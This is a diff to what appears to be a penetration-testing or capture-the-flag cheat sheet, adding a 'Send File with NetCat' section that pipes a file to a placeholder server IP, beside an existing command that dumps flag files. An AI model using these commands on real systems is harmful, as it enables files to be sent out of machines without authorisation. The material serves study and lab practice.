@@ -86,6 +86,7 @@
 * [Library Hijack](#Library-Hijack)
 * [C Shell Spawn](#C-Shell-Spawn)
 * [Dump Flags](#Dump-Flags)
+* [Send File with NetCat](#Send-File-with-NetCat)
 
 ## Frameworks
 
@@ -1355,7 +1356,17 @@ int main() {
 find / -type f -iname '*.flag' -exec echo{} \; -exec cat {} \; 2>/dev/null
 ```
 
+# Send File with NetCat
 
+### On Server (Receiver)
+```
+nc -lv -p 1337 -q 1 > {LOCAL_FILE} < /dev/null
+```
+
+### On Client (Sender)
+```
+cat {FILE} | netcat {SERVER_IP} 1337
+```
 
 
 
